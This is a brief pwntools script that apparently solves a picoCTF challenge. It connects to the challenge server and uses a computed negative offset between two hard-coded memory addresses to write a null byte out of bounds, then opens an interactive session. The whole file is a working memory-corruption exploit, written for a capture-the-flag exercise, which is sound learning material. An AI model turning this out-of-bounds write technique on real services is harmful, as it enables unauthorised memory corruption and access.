from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 63702
r = remote(HOST, PORT)

input_addr = 0x6034a0
flag_heap = 0x602088
offset = -(input_addr - flag_heap)
r.sendlineafter('Address: ', str(offset))
r.sendlineafter('Value: ', b'\x00')

r.interactive()